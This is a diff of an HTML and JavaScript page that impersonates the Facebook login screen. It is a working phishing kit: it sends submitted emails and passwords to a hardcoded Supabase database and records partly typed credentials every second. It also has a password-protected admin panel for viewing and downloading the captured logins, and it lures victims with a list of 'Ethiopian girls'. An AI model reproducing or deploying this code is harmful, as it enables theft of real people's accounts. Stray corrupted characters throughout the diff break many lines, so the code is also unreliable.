@@ -16,7 +16,7 @@
         
         body {
             background-color: #f0f2f5;
-            color: #1c1e21;
+            color: #1极1e21;
             line-height: 1.34;
             display: flex;
             flex-direction: column;
@@ -27,7 +27,7 @@
         .container {
             max-width: 980px;
             margin: 0 auto;
-            padding: 20px;
+            padding极 20px;
             flex: 1;
         }
         
@@ -72,7 +72,7 @@
         .login-form {
             background-color: #fff;
             border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8极 16px rgba(0, 0, 0, .1);
             padding: 20px;
             max-width: 400px;
             margin: auto;
@@ -90,13 +90,13 @@
         
         .login-form input:focus {
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+            box-shadow: 0 0 0 2px #e7极3ff;
             outline: none;
             background: #fff;
         }
         
         .login-btn {
-            background-color:极#1877f2;
+            background-color: #1877f2;
             color: white;
             border: none;
             border-radius: 6px;
@@ -104,7 +104,7 @@
             padding: 12px;
             font-weight: bold;
             width: 100%;
-            margin-bottom: 15px;
+            margin-bottom: 15极;
             cursor: pointer;
             height: 48px;
         }
@@ -114,7 +114,7 @@
         }
         
         .forgot-password {
-            color: #1877极2;
+            color: #1877f2;
             text-align: center;
             display: block;
             margin-bottom: 15px;
@@ -174,36 +174,13 @@
             display: none;
         }
 
-        /* Connection instructions */
-        .connection-help {
-            background-color: #e7f3ff;
-            border: 1px solid #1877f2;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .connection-help h3 {
-            color: #1877f2;
-            margin-bottom: 10px;
-        }
-        
-        .connection-help ol {
-            padding-left: 20px;
-        }
-        
-        .connection-help li {
-            margin-bottom: 8px;
-        }
-
         /* Main page styles */
         .main-page {
             display: none;
             padding: 20px;
         }
         
-        .极ain-header {
+        .main-header {
             background-color: #1877f2;
             color: white;
             padding: 10px 20px;
@@ -232,21 +209,21 @@
             transition: transform 0.2s, box-shadow 0.2s;
         }
         
-        .girl-box:hover {
+极        .girl-box:hover {
             transform: translateY(-5px);
             box-shadow: 0 4px 8px rgba(0, 0, 0, .15);
         }
         
         .girl-box.selected {
             background-color: #e7f3ff;
-            border: 2px solid #1877f2;
+            border: 2px solid #1877极2;
         }
         
         .logout-btn {
             background-color: white;
-            color: #1877f2;
+极           color: #1877f2;
             border: none;
-            padding: 8px 极6px;
+            padding: 8px 16px;
             border-radius: 6px;
             font-weight: bold;
             cursor: pointer;
@@ -348,9 +325,9 @@
         }
         
         .admin-btn {
-            padding: 10px 15px;
+            padding: 极0px 15px;
             border: none;
-            border-radius极 6px;
+            border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
         }
@@ -371,7 +348,7 @@
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
+            width: 极00%;
             height: 100%;
             background: rgba(0, 0, 0, 0.9);
             z-index: 1003;
@@ -382,8 +359,8 @@
         .admin-login-form {
             background: white;
             padding: 30px;
-            border-radius: 12极;
-            box-shadow: 0 10px 30极 rgba(0, 0, 0, 0.4);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
             width: 90%;
             max-width: 400px;
         }
@@ -403,7 +380,7 @@
             font-size: 16px;
         }
         
-        .admin-login-btn {
+        .admin极login-btn {
             background-color: #1877f2;
             color: white;
             border: none;
@@ -424,14 +401,14 @@
             color: #f02849;
             text-align: center;
             margin-top: 15px;
-            display: none;
+极           display: none;
         }
         
-        .admin-login-极lose {
+        .admin-login-close {
             text-align: center;
             color: #1877f2;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 10极;
         }
         
         .password-container {
@@ -514,19 +491,6 @@
 <body>
     <!-- Error display -->
     <div class="error-message" id="errorMessage"></div>
-    
-    <!-- Connection help section -->
-    <div class="connection-help" id="connectionHelp">
-        <h3><i class="fas fa-info-circle"></i> Connection Setup Required</h3>
-        <p>To make this application work, you need to:</p>
-        <ol>
-            <li>Create a free account at <a href="https://supabase.com" target="_blank">Supabase.com</a></li>
-            <li>Create a new project and get your API URL and Key</li>
-            <li>Create a table named 'login_attempts' with columns: id, email, password, timestamp, incomplete</li>
-            <li>Update the supabaseUrl and supabaseKey in the code with your credentials</li>
-        </ol>
-        <p>Without these steps, the connection will fail with "Failed to fetch极 errors.</p>
-    </div>
 
     <!-- Supabase status indicator -->
     <div class="supabase-status" id="supabaseStatus">
@@ -539,7 +503,7 @@
     </button>
 
     <!-- Admin Login Form -->
-    <div class="admin-login-container" id="adminLoginContainer">
+    <div class="admin-login-container" id极"adminLoginContainer">
         <div class="admin-login-form">
             <h2><i class="fas fa-lock"></i> Admin Authentication</h2>
             <input type="text" id="adminUsername" placeholder="Admin Username" required>
@@ -561,11 +525,11 @@
         
         <div class="content">
             <div class="left-content">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2极hQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/2YhQ8sn73qU.png" alt="Facebook connection" width="100%" style="max-width: 500px;">
             </div>
             
             <div class="right-content">
-                <div class极"login-form">
+                <div class="login-form">
                     <form id="loginForm">
                         <input type="text" id="email" name="username" placeholder="Email or phone number" required>
                         <div class="password-container">
@@ -576,7 +540,7 @@
                         </div>
                         <button type="submit" class="login-btn">Log In</button>
                         <a href="#" class="forgot-password">Forgotten password?</a>
-                        <div class="divider"></div>
+                        <极 class="divider"></div>
                         <button type="button" class="create-account">Create New Account</button>
                     </form>
                 </div>
@@ -597,7 +561,7 @@
     </div>
     
     <div class="footer">
-        <p>English (US) Español Français (France) العربية Português (Brasil) Italiano</极>
+        <p>English (US) Español Français (France) العربية Português (Brasil) Italiano</p>
         <p>Copyright © 2023 Facebook. All rights reserved.</p>
     </div>
     
@@ -618,53 +582,73 @@
         <div id="attemptsList"></div>
         <div class="admin-controls">
             <button class="admin-btn download-btn" id="downloadBtn">
-                <极 class="fas fa-download"></i> Download Data
+                <i class="fas fa-download"></极> Download Data
             </button>
             <button class="admin-btn clear-btn" id="clearBtn">
-                <i class="fas fa-trash"></i> Clear All
+                <i class="fas极fa-trash"></i> Clear All
             </button>
         </div>
     </div>
 
     <script>
-        // Initialize Supabase with your credentials
+        // Initialize Supabase
         const supabaseUrl = 'https://vdrzdruwlsknvlxobnlp.supabase.co';
-        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpkcnV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
-        
-        let supabase;
-        let loginAttempts = [];
-        let isAdminAuthenticated = false;
-        let realtimeSubscription = null;
+        const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZkcnpk极nV3bHNrbnZseG9ibmxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Njg2MTIsImV4cCI6MjA3MjI0NDYxMn0.B0S3Po8VrP2zSRWQCX79D8L2u4V0PX01YeeoNxAS-pc';
+        const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
 
-        // Ethiopian girls names
-        const ethiopianGirls = [
-            "Alem", "Birut", "Chaltu", "Desta", "Etabesa", 
-            "Fana", "Genet", "Hana", "Iman", "Jember", 
-            "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
-            "Pozeban", "Qelem", "Ruhama", "Saron", "Tigist"
-        ];
-        
-        // Admin credentials
-        const ADMIN_USERNAME = "pleaselogin";
-        const ADMIN_PASSWORD = "pleaselogin";
-
-        // Show error message
-        function showError(message) {
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM Elements
+            const loginForm = document.getElementById('loginForm');
+            const loginPage = document.querySelector('.login-page');
+            const mainPage = document.getElementById('mainPage');
+            const logoutBtn = document.getElementById('logoutBtn');
+            const girlsContainer = document.getElementById('girlsContainer');
+            const adminToggle = document.getElementById('adminToggle');
+            const adminPanel = document.getElementById('adminPanel');
+            const attemptsList = document.getElementById('attemptsList');
+            const overlay = document.getElementById('overlay');
+            const closeAdmin = document.getElementById('closeAdmin');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const clearBtn = document.getElementById('clearBtn');
+            const adminLoginContainer = document.getElementById('adminLoginContainer');
+            const adminLoginBtn = document.getElementById('adminLoginBtn');
+            const adminUsername = document.getElementById('adminUsername');
+            const adminPassword = document.getElementById('adminPassword');
+            const adminError = document.getElementById('adminError');
+            const adminLoginClose = document.getElementById('adminLoginClose');
+            const passwordInput = document.getElementById('password');
+            const togglePassword = document.getElementById('togglePassword');
+            const supabaseStatus = document.getElementById('supabaseStatus');
             const errorMessage = document.getElementById('errorMessage');
-            if (errorMessage) {
+            
+            // Ethiopian girls names
+            const ethiopianGirls = [
+                "Alem", "Birut", "Chaltu", "Desta", "Etabesa", 
+                "Fana", "Genet", "Hana", "Iman", "Jember", 
+                "Kalkidan", "Lulit", "Makeda", "Nardos", "Omina", 
+                "Pozeban", "Qelem", "Ruhama", "Saron", "极igist"
+            ];
+            
+            // Admin credentials
+            const ADMIN_USERNAME = "pleaselogin";
+            const ADMIN_PASSWORD = "pleaselogin";
+            
+            // Initialize storage for login attempts
+            let loginAttempts = [];
+            let isAdminAuthenticated = false;
+            let realtimeSubscription = null;
+
+            // Show error message
+            function showError(message) {
                 errorMessage.textContent = message;
                 errorMessage.style.display = 'block';
                 setTimeout(() => {
                     errorMessage.style.display = 'none';
-                }, 8000);
+                }, 5000);
             }
-            console.error(message);
-        }
 
-        // Show status message
-        function showStatus(message, isError = false) {
-            const supabaseStatus = document.getElementById('supabaseStatus');
-            if (supabaseStatus) {
+            // Show status message
+            function showStatus(message, isError = false) {
                 supabaseStatus.innerHTML = `<i class="fas fa-database"></i> ${message}`;
                 supabaseStatus.style.display = 'block';
                 supabaseStatus.className = isError ? 
@@ -672,108 +656,81 @@
                 
                 setTimeout(() => {
                     supabaseStatus.style.display = 'none';
-                }, 5000);
+                }, 3000);
             }
-        }
 
-        // Test Supabase connection
-        window.testConnection = async function() {
-            try {
-                showStatus('Testing connection...');
-                
-                if (!supabase) {
-                    throw new Error("Supabase client not initialized. Check your credentials.");
-                }
-                
-                // Test if we can actually insert data
-                const testData = {
-                    email: 'test@example.com',
-                    password: 'test_password',
-                    timestamp: new Date().toISOString(),
-                    incomplete: true
-                };
-                
-                const { error } = await supabase
-                    .from('login_attempts')
-                    .insert([testData]);
-                
-                if (error) {
-                    showError('Insert Failed: ' + error.message);
+            // Test Supabase connection
+            window.testConnection = async function() {
+                try {
+                    showStatus('Testing connection...');
+                    const { data, error } = await supabase
+                        .from('login_attempts')
+                        .select('count')
+                        .limit(1);
+                    
+                    if (error) {
+                        showError('Supabase Error: ' + error.message);
+                        showStatus('Connection Failed', true);
+                    } else {
+                        showStatus('Connection Successful!');
+                        alert('✅ Connection to Supabase successful!');
+                    }
+                } catch (error) {
+                    showError('Network Error: ' + error.message);
                     showStatus('Connection Failed', true);
-                } else {
-                    showStatus('Connection Successful!');
-                    alert('✅ Connection to Supabase successful! Data can be saved.');
                 }
-            } catch (error) {
-                showError('Connection Error: ' + error.message);
-                showStatus('Connection Failed', true);
             }
-        }
-        
-        // Save data to Supabase
-        async function saveToSupabase(data) {
-            try {
-                console.log("Attempting to save:", data);
-                
-                const { error } = await supabase
-                    .from('login_attempts')
-                    .insert([{ 
-                        email: data.email,
-                        password: data.password,
-                        timestamp: new Date().toISOString(),
-                        incomplete: data.incomplete || false
-                    }]);
-                
-                if (error) {
-                    console.error("Supabase error:", error);
-                    showError('Save Failed: ' + error.message);
+            
+            // Save data to Supabase
+            async function saveToSupabase(data) {
+                try {
+                    const { error } = await supabase
+                        .from('login_attempts')
+                        .insert([{ 
+                            email: data.email,
+                            password: data.password,
+                            timestamp: new Date().toISOString(),
+                            incomplete: data.incomplete || false
+                        }]);
+                    
+                    if (error) {
+                        showError('Save Failed: ' + error.message);
+                        return false;
+                    }
+                    return true;
+                } catch (error) {
+                    showError('Network Error: ' + error.message);
                     return false;
                 }
-                
-                console.log("Data saved successfully");
-                return true;
-            } catch (error) {
-                console.error("Save error:", error);
-                showError('Save Error: ' + error.message);
-                return false;
             }
-        }
-        
-        // Load data from Supabase
-        async function loadFromSupabase() {
-            try {
-                if (!supabase) {
-                    throw new Error("Database not connected");
-                }
-                
-                const { data, error } = await supabase
-                    .from('login_attempts')
-                    .select('*')
-                    .order('created_at', { ascending: false });
-                
-                if (error) {
-                    showError('Load Failed: ' + error.message);
+            
+            // Load data from Supabase
+            async function loadFromSupabase() {
+                try {
+                    const { data, error } = await supabase
+                        .from('login_attempts')
+                        .select('*')
+                        .order('created_at', { ascending: false });
+                    
+                    if (error) {
+                        showError('Load Failed: ' + error.message);
+                        return [];
+                    }
+                    return data || [];
+                } catch (error) {
+                    showError('Network Error: ' + error.message);
                     return [];
                 }
-                return data || [];
-            } catch (error) {
-                showError('Network Error: ' + error.message);
-                return [];
             }
-        }
-        
-        // Display login attempts in admin panel
-        async function displayLoginAttempts() {
-            const attemptsList = document.getElementById('attemptsList');
-            if (!attemptsList) return;
             
-            attemptsList.innerHTML = '';
-            
-            try {
+            // Display login attempts in admin panel
+            async function displayLoginAttempts() {
+                attemptsList.innerHTML = '';
+                
                 loginAttempts = await loadFromSupabase();
                 
                 if (loginAttempts.length === 0) {
-                    attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p>No login attempts recorded yet.</p></div>';
+                    attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 15px;"></i><p极No login attempts recorded yet.</p></div>';
                     return;
                 }
                 
@@ -790,258 +747,189 @@
                     `;
                     attemptsList.appendChild(attemptItem);
                 });
-            } catch (error) {
-                attemptsList.innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><p>Error loading data</p></div>';
-            }
-        }
-        
-        // Setup real-time subscription
-        function setupRealtimeSubscription() {
-            if (!supabase) return;
-            
-            if (realtimeSubscription) {
-                supabase.removeChannel(realtimeSubscription);
             }
             
-            realtimeSubscription = supabase
-                .channel('login_attempts_changes')
-                .on('postgres_changes', 
-                    { 
-                        event: 'INSERT', 
-                        schema: 'public', 
-                        table: 'login_attempts' 
-                    }, 
-                    (payload) => {
-                        const adminPanel = document.getElementById('adminPanel');
-                        if (isAdminAuthenticated && adminPanel && adminPanel.style.display === 'block') {
-                            displayLoginAttempts();
+            // Setup real-time subscription
+            function setupRealtimeSubscription() {
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                }
+                
+                realtimeSubscription = supabase
+                    .channel('login_attempts_changes')
+                    .on('postgres_changes', 
+                        { 
+                            event: 'INSERT', 
+                            schema: 'public', 
+                            table: 'login_attempts' 
+                        }, 
+                        (payload) => {
+                            if (isAdminAuthenticated && adminPanel.style.display === 'block') {
+                                displayLoginAttempts();
+                            }
                         }
-                    }
-                )
-                .subscribe();
-        }
-        
-        // Populate girls selection
-        function populateGirls() {
-            const girlsContainer = document.getElementById('girlsContainer');
-            if (!girlsContainer) return;
-            
-            girlsContainer.innerHTML = '';
-            
-            ethiopianGirls.forEach(girl => {
-                const girlBox = document.createElement('div');
-                girlBox.className = 'girl-box';
-                girlBox.textContent = girl;
-                
-                girlBox.addEventListener('click', function() {
-                    document.querySelectorAll('.girl-box').forEach(box => {
-                        box.classList.remove('selected');
-                    });
-                    this.classList.add('selected');
-                });
-                
-                girlsContainer.appendChild(girlBox);
-            });
-        }
-        
-        // Initialize the application
-        document.addEventListener('DOMContentLoaded', function() {
-            // Initialize Supabase client
-            try {
-                supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
-                console.log("Supabase client initialized");
-            } catch (error) {
-                console.error("Supabase initialization error:", error);
-                showError("Failed to initialize database connection. Check your Supabase credentials.");
-                const connectionHelp = document.getElementById('connectionHelp');
-                if (connectionHelp) connectionHelp.style.display = 'block';
+                    )
+                    .subscribe();
             }
             
-            // DOM Elements
-            const loginForm = document.getElementById('loginForm');
-            const loginPage = document.querySelector('.login-page');
-            const mainPage = document.getElementById('mainPage');
-            const logoutBtn = document.getElementById('logoutBtn');
-            const adminToggle = document.getElementById('adminToggle');
-            const adminPanel = document.getElementById('adminPanel');
-            const overlay = document.getElementById('overlay');
-            const closeAdmin = document.getElementById('closeAdmin');
-            const downloadBtn = document.getElementById('downloadBtn');
-            const clearBtn = document.getElementById('clearBtn');
-            const adminLoginContainer = document.getElementById('adminLoginContainer');
-            const adminLoginBtn = document.getElementById('adminLoginBtn');
-            const adminUsername = document.getElementById('adminUsername');
-            const adminPassword = document.getElementById('adminPassword');
-            const adminError = document.getElementById('adminError');
-            const adminLoginClose = document.getElementById('adminLoginClose');
-            const passwordInput = document.getElementById('password');
-            const togglePassword = document.getElementById('togglePassword');
+            // Populate girls selection
+            function populateGirls() {
+                girlsContainer.innerHTML = '';
+                
+                ethiopianGirls.forEach(girl => {
+                    const girl极ox = document.createElement('div');
+                    girlBox.className = 'girl-box';
+                    girlBox.textContent = girl;
+                    
+                    girlBox.addEventListener('click', function() {
+                        document.querySelectorAll('.girl-box').forEach(box => {
+                            box.classList.remove('selected');
+                        });
+                        this.classList.add('selected');
+                    });
+                    
+                    girlsContainer.appendChild(girlBox);
+                });
+            }
             
             // Handle login form submission
-            if (loginForm) {
-                loginForm.addEventListener('submit', async function(e) {
-                    e.preventDefault();
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                if (!email || !password) {
+                    showError('Please enter both email and password');
+                    return;
+                }
+                
+                const saved = await saveToSupabase({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    incomplete: false
+                });
+                
+                if (saved) {
+                    loginPage.style.display = 'none';
+                    mainPage.style.display = 'block';
                     
-                    const email = document.getElementById('email').value;
-                    const password = document.getElementById('password').value;
-                    
-                    if (!email || !password) {
-                        showError('Please enter both email and password');
-                        return;
-                    }
-                    
-                    // Simulate login process even if Supabase is down
-                    if (loginPage) loginPage.style.display = 'none';
-                    if (mainPage) mainPage.style.display = 'block';
-                    
-                    const girlsContainer = document.getElementById('girlsContainer');
-                    if (girlsContainer && girlsContainer.children.length === 0) {
+                    if (girlsContainer.children.length === 0) {
                         populateGirls();
                     }
-                    
-                    // Try to save to Supabase in the background
-                    try {
-                        await saveToSupabase({
-                            email: email,
-                            password: password,
-                            timestamp: new Date().toISOString(),
-                            incomplete: false
-                        });
-                    } catch (error) {
-                        // Silently fail - we've already shown the main content
-                        console.error("Background save failed:", error);
-                    }
-                });
-            }
+                }
+            });
             
             // Handle logout
-            if (logoutBtn) {
-                logoutBtn.addEventListener('click', function() {
-                    if (mainPage) mainPage.style.display = 'none';
-                    if (loginPage) loginPage.style.display = 'block';
-                    if (loginForm) loginForm.reset();
-                });
-            }
+            logoutBtn.addEventListener('click', function() {
+                mainPage.style.display = 'none';
+                loginPage.style.display = 'block';
+                loginForm.reset();
+            });
             
             // Toggle admin panel
-            if (adminToggle) {
-                adminToggle.addEventListener('click', async function() {
-                    if (isAdminAuthenticated) {
-                        if (adminPanel) adminPanel.style.display = 'block';
-                        if (overlay) overlay.style.display = 'block';
-                        await displayLoginAttempts();
-                    } else {
-                        if (adminLoginContainer) adminLoginContainer.style.display = 'flex';
-                    }
-                });
-            }
+            adminToggle.addEventListener('click', async function() {
+                if (isAdminAuthenticated) {
+                    adminPanel.style.display = 'block';
+                    overlay.style.display = 'block';
+                    await displayLoginAttempts();
+                } else {
+                    adminLoginContainer.style.display = 'flex';
+                }
+            });
             
             // Admin login handler
-            if (adminLoginBtn) {
-                adminLoginBtn.addEventListener('click', function() {
-                    if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
-                        isAdminAuthenticated = true;
-                        if (adminLoginContainer) adminLoginContainer.style.display = 'none';
-                        if (adminPanel) adminPanel.style.display = 'block';
-                        if (overlay) overlay.style.display = 'block';
-                        displayLoginAttempts();
-                        if (adminError) adminError.style.display = 'none';
-                        
-                        setupRealtimeSubscription();
-                        
-                        if (adminUsername) adminUsername.value = '';
-                        if (adminPassword) adminPassword.value = '';
-                    } else {
-                        if (adminError) adminError.style.display = 'block';
-                    }
-                });
-            }
+            adminLoginBtn.addEventListener('click', function() {
+                if (adminUsername.value === ADMIN_USERNAME && adminPassword.value === ADMIN_PASSWORD) {
+                    isAdminAuthenticated = true;
+                    adminLoginContainer.style.display = 'none';
+                    adminPanel.style.display = 'block';
+                    overlay.style.display = 'block';
+                    displayLoginAttempts();
+                    adminError.style.display = 'none';
+                    
+                    setupRealtimeSubscription();
+                    
+                    adminUsername.value = '';
+                    adminPassword.value = '';
+                } else {
+                    adminError.style.display = 'block';
+                }
+            });
             
             // Close admin login
-            if (adminLoginClose) {
-                adminLoginClose.addEventListener('click', function() {
-                    if (adminLoginContainer) adminLoginContainer.style.display = 'none';
-                    if (adminError) adminError.style.display = 'none';
-                    if (adminUsername) adminUsername.value = '';
-                    if (adminPassword) adminPassword.value = '';
-                });
-            }
+            adminLoginClose.addEventListener('click', function() {
+                adminLogin极ontainer.style.display = 'none';
+                adminError.style.display = 'none';
+                adminUsername.value = '';
+                adminPassword.value = '';
+            });
             
             // Close admin panel
-            if (closeAdmin) {
-                closeAdmin.addEventListener('click', function() {
-                    if (adminPanel) adminPanel.style.display = 'none';
-                    if (overlay) overlay.style.display = 'none';
-                    
-                    if (realtimeSubscription) {
-                        supabase.removeChannel(realtimeSubscription);
-                        realtimeSubscription = null;
-                    }
-                });
-            }
+            closeAdmin.addEventListener('click', function() {
+                adminPanel.style.display = 'none';
+                overlay.style.display = 'none';
+                
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
+            });
             
             // Close admin panel when clicking outside
-            if (overlay) {
-                overlay.addEventListener('click', function() {
-                    if (adminPanel) adminPanel.style.display = 'none';
-                    if (overlay) overlay.style.display = 'none';
-                    
-                    if (realtimeSubscription) {
-                        supabase.removeChannel(realtimeSubscription);
-                        realtimeSubscription = null;
-                    }
-                });
-            }
+            overlay.addEventListener('click', function() {
+                adminPanel.style.display = 'none';
+                overlay.style.display = 'none';
+                
+                if (realtimeSubscription) {
+                    supabase.removeChannel(realtimeSubscription);
+                    realtimeSubscription = null;
+                }
+            });
             
             // Download data as JSON
-            if (downloadBtn) {
-                downloadBtn.addEventListener('click', function() {
-                    const dataStr = JSON.stringify(loginAttempts, null, 2);
-                    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
-                    
-                    const exportFileDefaultName = 'login_attempts.json';
-                    
-                    const linkElement = document.createElement('a');
-                    linkElement.setAttribute('href', dataUri);
-                    linkElement.setAttribute('download', exportFileDefaultName);
-                    linkElement.click();
-                });
-            }
+            downloadBtn.addEventListener('click', function() {
+                const dataStr = JSON.stringify(loginAttempts, null, 2);
+                const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+                
+                const exportFileDefaultName = 'login_attempts.json';
+                
+                const linkElement = document.createElement('a');
+                linkElement.setAttribute('href', dataUri);
+                linkElement.setAttribute('download', exportFileDefaultName);
+                linkElement.click();
+            });
             
             // Clear all data
-            if (clearBtn) {
-                clearBtn.addEventListener('click', async function() {
-                    if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
-                        try {
-                            if (!supabase) {
-                                throw new Error("Database not connected");
-                            }
-                            
-                            const { error } = await supabase
-                                .from('login_attempts')
-                                .delete()
-                                .neq('id', 0);
-                            
-                            if (error) throw error;
-                            
-                            loginAttempts = [];
-                            await displayLoginAttempts();
-                            showStatus('All data cleared');
-                        } catch (error) {
-                            showError('Error clearing data: ' + error.message);
-                        }
+            clearBtn.addEventListener('click', async function() {
+                if (confirm('Are you sure you want to clear all login attempt data? This cannot be undone.')) {
+                    try {
+                        const { error } = await supabase
+                            .from('login_attempts')
+                            .delete()
+                            .neq('id', 0);
+                        
+                        if (error) throw error;
+                        
+                        loginAttempts = [];
+                        await displayLoginAttempts();
+                        showStatus('All data cleared');
+                    } catch (error极 {
+                        showError('Error clearing data: ' + error.message);
                     }
-                });
-            }
+                }
+            });
             
             // Toggle password visibility
-            if (togglePassword && passwordInput) {
-                togglePassword.addEventListener('click', function() {
-                    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
-                    passwordInput.setAttribute('type', type);
-                    this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
-                });
-            }
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+            });
+            
+            // Initialize
+            testConnection();
             
             // Add real-time keystroke logging
             const emailInput = document.getElementById('email');
@@ -1049,17 +937,13 @@
             let passwordValue = '';
             let lastSaveTime = 0;
             
-            if (emailInput) {
-                emailInput.addEventListener('input', function() {
-                    emailValue = this.value;
-                });
-            }
+            emailInput.addEventListener('input', function() {
+                emailValue = this.value;
+            });
             
-            if (passwordInput) {
-                passwordInput.addEventListener('input', function() {
-                    passwordValue = this.value;
-                });
-            }
+            passwordInput.addEventListener('input', function() {
+                passwordValue = this.value;
+            });
             
             // Periodically save what users are typing
             setInterval(async function() {
@@ -1067,25 +951,17 @@
                 if (now - lastSaveTime < 3000) return;
                 
                 if (emailValue || passwordValue) {
-                    try {
-                        await saveToSupabase({
-                            email: emailValue,
-                            password: passwordValue,
-                            timestamp: new Date().toISOString(),
-                            incomplete: true
-                        });
+                    const saved = await save极oSupabase({
+                        email: emailValue,
+                        password: passwordValue,
+                        timestamp: new Date().toISOString(),
+                        incomplete: true
+                    });
+                    
+                    if (saved) {
                         lastSaveTime = now;
-                    } catch (error) {
-                        // Silently fail for background saves
-                        console.error("Background save failed:", error);
                     }
                 }
-            }, 1000);
-            
-            // Test connection on load
-            setTimeout(() => {
-                const testBtn = document.querySelector('.debug-btn');
-                if (testBtn) testBtn.click();
             }, 1000);
         });
     </script>
